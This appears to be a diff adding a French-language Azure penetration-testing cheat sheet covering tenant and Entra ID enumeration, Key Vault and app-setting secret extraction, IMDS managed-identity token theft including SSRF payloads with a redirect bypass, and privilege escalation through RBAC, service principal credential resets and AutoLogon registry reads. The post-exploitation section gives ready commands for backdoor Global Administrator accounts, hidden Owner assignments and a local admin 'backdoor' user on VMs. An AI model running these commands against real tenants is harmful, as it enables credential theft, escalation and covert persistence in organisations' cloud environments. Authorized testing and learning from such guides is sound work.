@@ -1,0 +1,621 @@
+# 🔵 Azure Pentesting - Guide Complet
+
+Guide exhaustif pour l'énumération, l'identification de vecteurs et l'exploitation des vulnérabilités sur Microsoft Azure.
+
+---
+
+## 📖 Concepts Fondamentaux
+
+### Modèle de responsabilité partagée
+
+```
+┌──────────────────────────────────────────────────────┐
+│               RESPONSABILITÉ CLIENT                  │
+│  Données, IAM/RBAC, config réseau, OS (IaaS), apps   │
+├──────────────────────────────────────────────────────┤
+│             RESPONSABILITÉ PARTAGÉE                  │
+│         Chiffrement, journalisation, patchs          │
+├──────────────────────────────────────────────────────┤
+│            RESPONSABILITÉ FOURNISSEUR                │
+│     Infrastructure physique, hyperviseur, réseau     │
+└──────────────────────────────────────────────────────┘
+```
+
+> ⚠️ La majorité des compromissions Azure viennent de **RBAC trop permissif**, de **Managed Identities mal configurées** et de **credentials dans les variables d'apps**.
+
+### Les vecteurs principaux Azure
+
+```
+RBAC overpermissif      → Owner/Contributor accordés trop largement
+IMDS / Managed Identity → 169.254.169.254 → vol de token OAuth2
+Blob Storage public     → Containers accessibles anonymement
+Key Vault               → Secrets, certificats, clés accessibles
+Service Principal       → Credentials d'app réinitialisables
+Variables d'apps        → Azure Functions avec secrets en clair
+Entra ID misconfigured  → Rôles admin, guest users, app registrations
+AutoLogon               → Credentials en clair dans le registre
+```
+
+---
+
+## 1️⃣ Concepts Clés Azure
+
+```
+Entra ID (ex-Azure AD)  → Service d'identité (users, groupes, apps, SP)
+Subscriptions           → Unité de facturation/périmètre de ressources
+Resource Groups         → Conteneurs logiques de ressources
+RBAC                    → Role-Based Access Control (Owner, Contributor, Reader...)
+Managed Identity        → Identité pour les ressources Azure (System/User assigned)
+Service Principal       → Identité pour les applications (≈ AWS Role pour apps)
+Key Vault               → Stockage de secrets/certificats/clés
+Blob Storage            → Stockage objet (équivalent S3)
+Azure Functions         → Serverless (équivalent Lambda)
+```
+
+### Hiérarchie Azure
+
+```
+Management Group
+└── Tenant (Entra ID)
+    └── Subscriptions
+        └── Resource Groups
+            └── Resources (VMs, Storage, Functions, etc.)
+
+Les permissions RBAC s'héritent de haut en bas.
+Owner sur une Subscription → Owner sur tous les Resource Groups et ressources.
+```
+
+### Rôles RBAC intégrés
+
+```
+Owner                    → Tout faire, y compris gérer les accès → CIBLE
+Contributor              → Tout faire SAUF gérer les accès
+Reader                   → Lecture seule
+User Access Administrator → Gérer les accès uniquement → peut s'élever Owner
+```
+
+### Rôles Entra ID dangereux
+
+```
+Global Administrator          → Contrôle total du tenant → CIBLE PRINCIPALE
+Application Administrator     → Gérer toutes les app registrations
+Cloud Application Administrator → Gérer les apps sans rôle tenant
+Privileged Role Administrator → Gérer les assignations de rôles
+User Administrator            → Créer/modifier des users
+```
+
+---
+
+## 2️⃣ Configuration & Authentification
+
+```bash
+# Installation CLI Azure
+curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
+
+# Login interactif (ouvre un navigateur)
+az login
+
+# Login avec credentials Service Principal
+az login --service-principal \
+  --username APP_ID \
+  --password PASSWORD \
+  --tenant TENANT_ID
+
+# Login avec certificat SP
+az login --service-principal \
+  --username APP_ID \
+  --tenant TENANT_ID \
+  --password /path/to/cert.pem
+
+# Login avec Managed Identity (depuis une VM Azure)
+az login --identity
+az login --identity --username USER_ASSIGNED_MI_CLIENT_ID
+
+# Vérifier le contexte courant
+az account show
+az account list --output table
+
+# Changer de subscription
+az account set --subscription SUBSCRIPTION_ID
+
+# PowerShell Az module
+Install-Module Az -Force
+Connect-AzAccount
+Connect-AzAccount -ServicePrincipal -Credential $cred -Tenant TENANT_ID
+
+# MSOnline (Entra ID)
+Install-Module MSOnline
+Connect-MsolService
+```
+
+---
+
+## 3️⃣ Énumération de Base
+
+```bash
+# Informations du tenant
+az account tenant list
+az account show
+
+# Lister les subscriptions accessibles
+az account list --output table
+az account list --query '[*].[name,id,state]' --output table
+
+# Identité Entra ID connectée
+az ad signed-in-user show
+
+# Rôles RBAC assignés à l'utilisateur courant
+az role assignment list \
+  --assignee $(az ad signed-in-user show --query id -o tsv) \
+  --all --output table
+
+# Toutes les assignations de rôles (si droits suffisants)
+az role assignment list --all --output table
+az role assignment list --all \
+  --query '[*].[principalName,roleDefinitionName,scope]' --output table
+
+# Chercher les Owners et Contributors
+az role assignment list --all \
+  --query '[?roleDefinitionName==`Owner`].[principalName,scope]' --output table
+az role assignment list --all \
+  --query '[?roleDefinitionName==`Contributor`].[principalName,scope]' --output table
+```
+
+---
+
+## 4️⃣ Énumération Entra ID (Identités)
+
+```bash
+# Utilisateurs
+az ad user list --output table
+az ad user show --id user@domain.com
+az ad user list --query '[*].[displayName,userPrincipalName,id]' --output table
+
+# Groupes
+az ad group list --output table
+az ad group member list --group "GROUP_NAME"
+az ad group list --query '[*].[displayName,id]' --output table
+
+# Applications et Service Principals
+az ad app list --output table
+az ad sp list --output table
+az ad sp show --id SP_ID
+
+# Rôles Entra ID assignés (admin roles)
+az rest --method GET \
+  --url "https://graph.microsoft.com/v1.0/directoryRoles"
+
+# Membres du rôle Global Administrator
+az rest --method GET \
+  --url "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members"
+
+# Credentials d'une application (secrets/certificats)
+az ad app credential list --id APP_ID
+
+# PowerShell — Informations Entra ID
+Import-Module MSOnline
+Connect-MsolService
+Get-MsolCompanyInformation     # DirSync, MFA status...
+Get-MsolUser -All              # Tous les users
+Get-MsolRole                   # Rôles admin
+Get-MsolRoleMember -RoleObjectId ROLE_ID  # Membres d'un rôle
+```
+
+---
+
+## 5️⃣ Énumération des Ressources
+
+```bash
+# Toutes les ressources accessibles
+az resource list --output table
+az resource list \
+  --query '[*].[name,type,resourceGroup,location]' --output table
+
+# Resource Groups
+az group list --output table
+
+# VMs
+az vm list --output table
+az vm list --show-details --output table   # Avec IP publique
+az vm list --query \
+  '[*].[name,location,powerState,publicIps,privateIps]' --output table
+
+# Storage Accounts
+az storage account list --output table
+
+# Containers Blob d'un storage account
+az storage container list \
+  --account-name STORAGE_ACCOUNT \
+  --auth-mode login
+
+# Blobs d'un container
+az storage blob list \
+  --container-name CONTAINER \
+  --account-name STORAGE_ACCOUNT
+
+# Tester accès public Blob (sans credentials)
+curl "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"
+curl "https://ACCOUNT.blob.core.windows.net/CONTAINER/file.txt"
+
+# Azure Functions
+az functionapp list --output table
+
+# Variables d'environnement Functions (souvent des secrets !)
+az functionapp config appsettings list \
+  --name FUNCTION_NAME \
+  --resource-group RG_NAME
+
+# Web Apps
+az webapp list --output table
+az webapp config appsettings list \
+  --name WEBAPP_NAME \
+  --resource-group RG_NAME
+
+# PowerShell
+Get-AzResource | Select-Object Name,ResourceType,ResourceGroupName | Format-Table
+Get-AzVM | Select-Object Name,Location,@{n="Status";e={$_.PowerState}} | Format-Table
+```
+
+---
+
+## 6️⃣ Key Vault — Cible Principale
+
+```bash
+# Lister les Key Vaults accessibles
+az keyvault list --output table
+
+# Secrets
+az keyvault secret list --vault-name VAULT_NAME
+az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME
+# → Connection strings, mots de passe, API keys...
+
+# Versions d'un secret (anciennes valeurs !)
+az keyvault secret list-versions \
+  --vault-name VAULT_NAME --name SECRET_NAME
+az keyvault secret show \
+  --vault-name VAULT_NAME --name SECRET_NAME --version VERSION_ID
+
+# Certificats
+az keyvault certificate list --vault-name VAULT_NAME
+az keyvault certificate show --vault-name VAULT_NAME --name CERT_NAME
+
+# Clés cryptographiques
+az keyvault key list --vault-name VAULT_NAME
+
+# Politique d'accès du Key Vault (qui peut lire quoi)
+az keyvault show --name VAULT_NAME \
+  --query 'properties.accessPolicies' --output table
+
+# PowerShell
+Get-AzKeyVaultSecret -VaultName "VaultName"
+Get-AzKeyVaultSecret -VaultName "VaultName" -Name "SecretName" -AsPlainText
+```
+
+---
+
+## 7️⃣ IMDS — Vol de Token Managed Identity
+
+```bash
+# Depuis une VM Azure avec Managed Identity assignée
+# Ou via SSRF sur une app hébergée sur Azure
+
+# Récupérer un token OAuth2 pour l'API Azure Management
+curl -s -H "Metadata:true" \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+
+# Token pour Microsoft Graph (Entra ID)
+curl -s -H "Metadata:true" \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"
+
+# Token pour Key Vault
+curl -s -H "Metadata:true" \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
+
+# Informations de l'instance
+curl -s -H "Metadata:true" \
+  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool
+
+# Utiliser le token
+TOKEN=$(curl -s -H "Metadata:true" \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
+
+# Appeler l'API Azure Management
+curl -H "Authorization: Bearer $TOKEN" \
+  "https://management.azure.com/subscriptions?api-version=2020-01-01"
+
+# Lister les ressources avec le token
+curl -H "Authorization: Bearer $TOKEN" \
+  "https://management.azure.com/subscriptions/SUBSCRIPTION_ID/resources?api-version=2021-04-01"
+```
+
+### Payloads SSRF vers IMDS Azure
+
+```
+# Header obligatoire : Metadata: true
+# Note : Azure IMDSv2 requiert ce header, souvent contournable via redirect HTTP
+
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+
+# Si le header Metadata:true est filtré → essayer via redirect
+# Créer un serveur qui répond avec un 301 vers l'IMDS
+```
+
+---
+
+## 8️⃣ Privilege Escalation
+
+### Escalade via RBAC
+
+```bash
+# Si rôle Owner ou User Access Administrator sur une subscription
+# Ajouter son propre user comme Owner
+az role assignment create \
+  --assignee YOUR_USER_OBJECT_ID \
+  --role Owner \
+  --scope /subscriptions/SUBSCRIPTION_ID
+
+# Escalade sur un Resource Group uniquement
+az role assignment create \
+  --assignee YOUR_USER_OBJECT_ID \
+  --role Owner \
+  --scope /subscriptions/SUB_ID/resourceGroups/RG_NAME
+
+# Vérifier l'escalade
+az role assignment list --assignee YOUR_USER_OBJECT_ID --all
+```
+
+### Escalade via Service Principal
+
+```bash
+# Si droits Application Administrator ou suffisants sur une app
+
+# Lister les credentials existantes
+az ad app credential list --id APP_ID
+
+# Réinitialiser / ajouter des credentials à une app
+az ad app credential reset --id APP_ID
+# → Retourne AppId, Password, Tenant
+
+# Login en tant que Service Principal
+az login --service-principal \
+  --username APP_ID \
+  --password NEW_PASSWORD \
+  --tenant TENANT_ID
+
+# Vérifier les permissions du SP
+az role assignment list --assignee SP_OBJECT_ID --all
+```
+
+### Escalade via Managed Identity Token
+
+```bash
+# Depuis une VM avec Managed Identity → obtenir un token
+TOKEN=$(curl -s -H "Metadata:true" \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
+
+# Lister mes rôles avec ce token
+curl -H "Authorization: Bearer $TOKEN" \
+  "https://management.azure.com/subscriptions/SUB_ID/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"
+
+# Lire les secrets Key Vault avec le token
+curl -H "Authorization: Bearer $KV_TOKEN" \
+  "https://VAULT_NAME.vault.azure.net/secrets?api-version=7.3"
+```
+
+### Escalade via Key Vault
+
+```bash
+# Si accès en lecture → récupérer des credentials hauts privilèges
+az keyvault secret list --vault-name TARGET_VAULT
+az keyvault secret show --vault-name TARGET_VAULT --name db-admin-password
+az keyvault secret show --vault-name TARGET_VAULT --name sp-client-secret
+# → Utiliser ces credentials pour s'authentifier en tant qu'admin
+```
+
+### Escalade via AutoLogon (VM Windows)
+
+```powershell
+# Credentials AutoLogon stockées en clair dans le registre
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+# → Credentials d'un compte de service potentiellement admin Azure
+```
+
+### Dump de credentials depuis Azure Functions
+
+```bash
+# Variables d'environnement (souvent : connection strings, secrets)
+az functionapp config appsettings list \
+  --name FUNCTION_NAME \
+  --resource-group RG_NAME
+# → StorageConnectionString, DatabasePassword, ServicePrincipalSecret...
+```
+
+---
+
+## 9️⃣ Post-Exploitation & Persistance
+
+```bash
+# Ajouter un Owner caché sur la subscription
+az role assignment create \
+  --assignee ATTACKER_OBJECT_ID \
+  --role Owner \
+  --scope /subscriptions/SUBSCRIPTION_ID
+
+# Créer un user backdoor dans Entra ID
+az ad user create \
+  --display-name "Support Account" \
+  --user-principal-name support@domain.onmicrosoft.com \
+  --password "P@ssw0rd123!"
+
+# Ajouter le user au rôle Global Administrator
+az rest --method POST \
+  --url "https://graph.microsoft.com/v1.0/directoryRoles/ROLE_ID/members/\$ref" \
+  --body '{"@odata.id": "https://graph.microsoft.com/v1.0/users/USER_ID"}'
+
+# Créer un Service Principal backdoor
+az ad sp create-for-rbac --name "monitoring-app" --role Owner \
+  --scopes /subscriptions/SUBSCRIPTION_ID
+# → Sauvegarder appId, password, tenant
+
+# Activer RDP sur une VM compromise
+az vm run-command invoke \
+  --resource-group RG_NAME \
+  --name VM_NAME \
+  --command-id RunPowerShellScript \
+  --scripts "net user backdoor Password123! /add; net localgroup administrators backdoor /add"
+```
+
+---
+
+## 🔟 Outils Azure
+
+```bash
+# ── Az CLI (officiel) ──────────────────────────────────
+az login
+az resource list
+az role assignment list --all
+az keyvault secret show --vault-name VAULT --name SECRET
+
+# ── PowerZure (offensif Azure/Entra ID via PowerShell) ─
+Import-Module .\PowerZure.ps1
+Show-AzureTargets
+Get-AzureRoleAssignments
+Get-AzureKeyVaultContent -VaultName "vault"
+Get-AzureRunAsAccounts
+Get-AzureAppSecrets
+
+# ── ROADtools (recon Entra ID) ─────────────────────────
+pip install roadrecon
+roadrecon auth -u user@domain.com -p password
+roadrecon auth --device-code              # Auth sans mot de passe
+roadrecon gather                          # Collecter toutes les données
+roadrecon gui                             # Interface web d'exploration
+# → Cartographie complète Entra ID
+
+# ── BloodHound + AzureHound (graphe d'attaque) ─────────
+# https://github.com/BloodHoundAD/AzureHound
+./azurehound -u user@domain.com -p password \
+  list --tenant TENANT_ID -o output.json
+# Importer dans BloodHound → chemins d'attaque visuels
+
+# ── ScoutSuite (audit de configuration) ────────────────
+pip install scoutsuite
+scout azure --cli                              # Avec az login préalable
+scout azure --sp APP_ID PASSWORD TENANT_ID    # Avec SP credentials
+# → Rapport HTML dans scoutsuite-report/
+
+# ── Stormspotter (visualisation ressources Azure) ──────
+git clone https://github.com/Azure/Stormspotter
+
+# ── Prowler (benchmark CIS/NIST) ───────────────────────
+pip install prowler
+prowler azure --sp-env-auth
+prowler azure -c azure_rbac_no_custom_subscription_owner_roles_created
+
+# ── Trufflehog (leak de secrets) ───────────────────────
+trufflehog git https://github.com/target/repo
+trufflehog filesystem /path/to/code
+
+# ── Gitleaks ───────────────────────────────────────────
+gitleaks detect --source . --verbose
+gitleaks detect --source . -r report.json
+```
+
+---
+
+## 1️⃣1️⃣ Cheatsheet Rapide
+
+```bash
+# ═══════════════════════════════
+# IDENTITÉ & PERMISSIONS
+# ═══════════════════════════════
+az account show                                           # Qui suis-je ?
+az ad signed-in-user show                                 # Mon identité Entra ID
+az role assignment list \
+  --assignee $(az ad signed-in-user show --query id -o tsv) --all
+az role assignment list --all \
+  --query '[?roleDefinitionName==`Owner`].[principalName,scope]' --output table
+
+# ═══════════════════════════════
+# ÉNUMÉRATION ENTRA ID
+# ═══════════════════════════════
+az ad user list --output table
+az ad group list --output table
+az ad app list --output table
+az ad sp list --output table
+roadrecon auth && roadrecon gather && roadrecon gui       # Recon complet
+
+# ═══════════════════════════════
+# RESSOURCES
+# ═══════════════════════════════
+az resource list --output table
+az vm list --show-details --output table
+az storage account list --output table
+az functionapp list --output table
+
+# ═══════════════════════════════
+# SECRETS
+# ═══════════════════════════════
+az keyvault list --output table
+az keyvault secret list --vault-name VAULT
+az keyvault secret show --vault-name VAULT --name SECRET
+az functionapp config appsettings list --name FUNC -g RG
+az webapp config appsettings list --name APP -g RG
+
+# ═══════════════════════════════
+# IMDS (depuis VM / SSRF)
+# ═══════════════════════════════
+curl -H "Metadata:true" \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+curl -H "Metadata:true" \
+  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+
+# ═══════════════════════════════
+# PRIVESC
+# ═══════════════════════════════
+# RBAC Owner
+az role assignment create --assignee MY_ID --role Owner --scope /subscriptions/SUB_ID
+# SP credentials reset
+az ad app credential reset --id APP_ID
+# Key Vault
+az keyvault secret show --vault-name VAULT --name sp-client-secret
+# AutoLogon Windows
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+
+# ═══════════════════════════════
+# PERSISTANCE
+# ═══════════════════════════════
+az ad sp create-for-rbac --name "monitoring-app" --role Owner \
+  --scopes /subscriptions/SUBSCRIPTION_ID
+az role assignment create --assignee ATTACKER_ID --role Owner \
+  --scope /subscriptions/SUBSCRIPTION_ID
+
+# ═══════════════════════════════
+# OUTILS
+# ═══════════════════════════════
+scout azure --cli                   # Audit config
+roadrecon gather && roadrecon gui   # Recon Entra ID
+# BloodHound + AzureHound           # Graphe d'attaque
+```
+
+---
+
+## 📚 Ressources
+
+- **HackTricks Azure** : https://cloud.hacktricks.xyz/pentesting-cloud/azure-security
+- **ROADtools** : https://github.com/dirkjanm/ROADtools
+- **PowerZure** : https://github.com/hausec/PowerZure
+- **BloodHound / AzureHound** : https://github.com/BloodHoundAD/AzureHound
+- **Stormspotter** : https://github.com/Azure/Stormspotter
+- **ScoutSuite** : https://github.com/nccgroup/ScoutSuite
+- **Prowler** : https://github.com/prowler-cloud/prowler
+- **Azure Security Benchmark** : https://docs.microsoft.com/en-us/security/benchmark/azure/
+- **PayloadsAllTheThings Azure** : https://github.com/swisskyrepo/PayloadsAllTheThings
+
+---
+
+**Tags:** `#azure #entraid #rbac #managedidentity #keyvault #blob #imds #ssrf #privesc #roadtools #bloodhound #scoutsuite #ctf #pentest #cloud`
